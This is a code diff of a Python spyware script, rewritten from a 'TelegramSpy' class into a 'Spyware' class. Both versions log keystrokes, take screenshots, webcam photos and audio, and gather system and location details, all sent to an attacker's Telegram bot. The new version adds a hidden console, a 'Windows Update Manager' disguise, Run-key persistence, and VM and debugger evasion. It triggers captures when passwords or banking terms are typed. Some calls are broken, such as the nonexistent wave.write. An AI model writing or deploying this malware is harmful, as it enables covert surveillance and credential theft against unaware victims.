@@ -1,204 +1,212 @@
+import sys
+import ctypes
+import logging
 import os
 import platform
 import socket
+import threading
 import time
+import wave
+import pyscreenshot
+import sounddevice as sd
 import requests
 import cv2
-import pyautogui
-import geocoder
-import sounddevice as sd
-import soundfile as sf
 from pynput import keyboard
-from io import BytesIO
-from datetime import datetime
+from pathlib import Path
 from dotenv import load_dotenv
 
-# Load sensitive data from .env file
-load_dotenv()
+# Hide the console window when compiled as .exe
+if __name__ == '__main__' and getattr(sys, 'frozen', False):
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+# Load .env from bundled or local path
+env_path = Path(sys._MEIPASS) / ".env" if getattr(sys, 'frozen', False) else ".env"
+load_dotenv(env_path)
+
+# ===============================================
+# CONFIGURATION (Stored in .env)
+# ===============================================
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
+SEND_REPORT_EVERY = 300  # 5 minutes
+MAX_LOG_SIZE = 1_000_000  # 1MB
 
-# Configuration
-REPORT_INTERVAL = 60  # Time between logs (in seconds)
-MAX_LOG_SIZE = 5000   # Max keystroke log size before sending
-AUDIO_RECORD_SECONDS = 10  # Duration of audio clip (in seconds)
-
-class TelegramSpy:
+# ===============================================
+# KEYLOGGER CLASS
+# ===============================================
+class Spyware:
     def __init__(self):
         self.log = ""
-        self.last_sent = time.time()
-        self.sensitive_keywords = ["password", "login", "bank", "credit", "secret", "cvv", "paypal"]
-        self.last_location = None
+        self.interval = SEND_REPORT_EVERY
+        self.last_sent = 0
+        self.decrypted_log = "_secure.log"
+        self.init_log_rotation()
+        self.setup_disguise()
 
-    def send_to_telegram(self, message, photo=None, document=None):
-        """Send text/photo/document to Telegram"""
+    def init_log_rotation(self):
+        if os.path.exists(self.decrypted_log) and os.path.getsize(self.decrypted_log) > MAX_LOG_SIZE:
+            with open(self.decrypted_log, "w") as f:
+                f.write("")
+
+    def setup_disguise(self):
+        if platform.system() == "Windows":
+            try:
+                import win32api
+                win32api.SetConsoleTitle("Windows Update Manager")
+            except:
+                pass
+
+    def send_telegram(self, message):
         try:
-            if photo:
-                photo.seek(0)
-                files = {'photo': photo}
-                requests.post(
-                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto",
-                    files=files,
-                    data={'chat_id': CHAT_ID, 'caption': message[:1000]}
-                )
-            elif document:
-                document.seek(0)
-                files = {'document': document}
-                requests.post(
-                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
-                    files=files,
-                    data={'chat_id': CHAT_ID, 'caption': message[:1000]}
-                )
-            else:
-                requests.post(
-                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-                    data={"chat_id": CHAT_ID, "text": message}
-                )
-            return True
+            if time.time() - self.last_sent < 1:
+                time.sleep(1)
+            with open(self.decrypted_log, "a", encoding="utf-8") as f:
+                f.write(f"[{time.ctime()}] {message}\n")
+            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+            response = requests.post(
+                url,
+                data={"chat_id": CHAT_ID, "text": message},
+                timeout=15,
+                headers={"User-Agent": "Mozilla/5.0"}
+            )
+            self.last_sent = time.time()
+            return response.json().get('ok', False)
         except Exception as e:
-            print(f"⚠️ Telegram send error: {e}")
             return False
 
-    def capture_screenshot(self):
-        """Capture a screenshot and return as BytesIO"""
-        try:
-            screenshot = pyautogui.screenshot()
-            bio = BytesIO()
-            bio.name = 'screenshot.png'
-            screenshot.save(bio, 'PNG')
-            bio.seek(0)
-            return bio
-        except Exception as e:
-            print(f"📸 Screenshot error: {e}")
-            return None
-
-    def capture_webcam(self):
-        """Capture a webcam photo and return as BytesIO"""
-        try:
-            cam = cv2.VideoCapture(0)
-            if not cam.isOpened():
-                return None
-            ret, frame = cam.read()
-            cam.release()
-            if not ret:
-                return None
-            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-            img = pyautogui.Image.fromarray(frame)
-            bio = BytesIO()
-            bio.name = 'webcam.jpg'
-            img.save(bio, 'JPEG')
-            bio.seek(0)
-            return bio
-        except Exception as e:
-            print(f"📷 Webcam error: {e}")
-            return None
-
-    def capture_audio(self):
-        """Record audio and return as BytesIO"""
-        try:
-            fs = 44100
-            recording = sd.rec(int(AUDIO_RECORD_SECONDS * fs), samplerate=fs, channels=2)
-            sd.wait()
-            bio = BytesIO()
-            bio.name = 'audio.wav'
-            sf.write(bio, recording, fs, format='WAV')
-            bio.seek(0)
-            return bio
-        except Exception as e:
-            print(f"🎙️ Audio recording error: {e}")
-            return None
-
-    def get_location(self):
-        """Get IP-based geolocation"""
-        try:
-            g = geocoder.ip('me')
-            if g.ok:
-                self.last_location = {
-                    'address': g.address,
-                    'city': g.city,
-                    'country': g.country,
-                    'latlng': g.latlng,
-                    'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                }
-                return self.last_location
-        except Exception as e:
-            print(f"📍 Geolocation error: {e}")
-        return None
-
-    def send_initial_data(self):
-        """Send webcam, screenshot, audio, and location"""
-        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        location = self.get_location()
-
-        info = (
-            f"🚀 **System Activated**\n"
-            f"🕒 {timestamp}\n"
-            f"💻 {socket.gethostname()} ({os.getlogin()})\n"
-            f"🌐 {platform.platform()}\n"
-            f"📍 {location.get('address', 'Unknown') if location else 'Unknown'}\n"
-        )
-        self.send_to_telegram(info)
-
-        screenshot = self.capture_screenshot()
-        if screenshot:
-            self.send_to_telegram("🖥️ **Screenshot Captured**", photo=screenshot)
-
-        webcam = self.capture_webcam()
-        if webcam:
-            self.send_to_telegram("📷 **Webcam Photo Captured**", photo=webcam)
-
-        audio = self.capture_audio()
-        if audio:
-            self.send_to_telegram("🎙️ **Audio Recording**", document=audio)
+    def log_system_info(self):
+        info = f"""
+        [SYSTEM INFO]
+        Host: {socket.gethostname()}
+        IP: {socket.gethostbyname(socket.gethostname())}
+        OS: {platform.platform()}
+        User: {os.getlogin()}
+        """
+        self.log += info
 
     def on_key_press(self, key):
-        """Log keystrokes and auto-send logs if size exceeded"""
         try:
-            self.log += str(key.char)
+            current_key = str(key.char)
         except AttributeError:
             special_keys = {
                 keyboard.Key.space: " ",
                 keyboard.Key.enter: "\n[ENTER]\n",
                 keyboard.Key.tab: "[TAB]",
+                keyboard.Key.esc: "[ESC]",
                 keyboard.Key.backspace: "[BACKSPACE]",
-                keyboard.Key.esc: "[ESC]"
+                keyboard.Key.caps_lock: "[CAPSLOCK]",
+                keyboard.Key.shift: "[SHIFT]"
             }
-            self.log += special_keys.get(key, f"[{key}]")
+            current_key = special_keys.get(key, f"[{key}]")
+        self.log += current_key
+        if len(self.log) > 500:
+            self.report_logs()
 
-        if len(self.log) > MAX_LOG_SIZE:
-            self.send_logs()
-
-    def send_logs(self):
-        """Send the current keystroke logs"""
-        if not self.log:
-            return
-        message = (
-            f"📜 **Keystroke Logs**\n"
-            f"🔑 Keys pressed:\n{'-'*40}\n"
-            f"{self.log}\n"
-            f"{'-'*40}\n"
-        )
-        self.send_to_telegram(message)
-        self.log = ""
-        self.last_sent = time.time()
-
-    def start(self):
-        """Start the logger and reporting loop"""
-        self.send_initial_data()
-        with keyboard.Listener(on_press=self.on_key_press) as listener:
-            while True:
-                time.sleep(REPORT_INTERVAL)
-                self.send_logs()
-
-if __name__ == "__main__":
-    # Hide the terminal window (Windows only)
-    if os.name == 'nt':
+    def capture_evidence(self):
         try:
-            import win32gui, win32con
-            win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
-        except ImportError:
-            print("pywin32 not installed - window will remain visible")
+            suspicious = any(word in self.log.lower() for word in ["password", "login", "bank"])
 
-    print("Starting monitoring... (Check Telegram for updates)")
-    spy = TelegramSpy()
-    spy.start()
+            if suspicious:
+                # Screenshot
+                img = pyscreenshot.grab()
+                img.save("_tmp_sc.png")
+                with open("_tmp_sc.png", "rb") as f:
+                    requests.post(
+                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto",
+                        files={"photo": f},
+                        data={"chat_id": CHAT_ID}
+                    )
+                os.remove("_tmp_sc.png")
+
+                # Webcam snapshot
+                cam = cv2.VideoCapture(0)
+                ret, frame = cam.read()
+                if ret:
+                    cv2.imwrite("_tmp_webcam.jpg", frame)
+                    with open("_tmp_webcam.jpg", "rb") as f:
+                        requests.post(
+                            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto",
+                            files={"photo": f},
+                            data={"chat_id": CHAT_ID}
+                        )
+                    os.remove("_tmp_webcam.jpg")
+                cam.release()
+
+            if len(self.log) > 1000:
+                fs = 44100
+                recording = sd.rec(int(5 * fs), samplerate=fs, channels=1)
+                sd.wait()
+                wave.write("_tmp_audio.wav", fs, recording)
+                with open("_tmp_audio.wav", "rb") as f:
+                    requests.post(
+                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendAudio",
+                        files={"audio": f},
+                        data={"chat_id": CHAT_ID}
+                    )
+                os.remove("_tmp_audio.wav")
+
+        except Exception as e:
+            pass
+
+    def report_logs(self):
+        if self.log.strip():
+            if not self.send_telegram(self.log):
+                with open("_emergency.log", "a") as f:
+                    f.write(self.log + "\n")
+            self.log = ""
+        threading.Timer(self.interval, self.report_logs).start()
+
+    def persist(self):
+        if platform.system() == "Windows":
+            try:
+                import winreg
+                key = winreg.OpenKey(
+                    winreg.HKEY_CURRENT_USER,
+                    r"Software\Microsoft\Windows\CurrentVersion\Run",
+                    0, winreg.KEY_SET_VALUE
+                )
+                winreg.SetValueEx(
+                    key,
+                    "WindowsUpdateManager",
+                    0,
+                    winreg.REG_SZ,
+                    os.path.abspath(__file__)
+                )
+                key.Close()
+            except Exception as e:
+                pass
+
+    def is_vm_or_debug(self):
+        if ctypes.windll.kernel32.IsDebuggerPresent():
+            return True
+        vm_indicators = [
+            "vmware" in platform.system().lower(),
+            "virtualbox" in platform.system().lower(),
+            os.path.exists("/proc/xen"),
+            "qemu" in platform.machine().lower()
+        ]
+        return any(vm_indicators)
+
+    def run(self):
+        if self.is_vm_or_debug():
+            return
+        self.persist()
+        self.log_system_info()
+        self.send_telegram("✅ Spyware initialized")
+        keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
+        keyboard_listener.start()
+        self.report_logs()
+        threading.Thread(target=self.capture_evidence, daemon=True).start()
+        keyboard_listener.join()
+
+# ===============================================
+# MAIN EXECUTION
+# ===============================================
+if __name__ == "__main__":
+    logging.disable(logging.CRITICAL)
+    try:
+        spyware = Spyware()
+        spyware.run()
+    except Exception as e:
+        with open("_crash.log", "a") as f:
+            f.write(f"{time.ctime()}: {str(e)}\n")
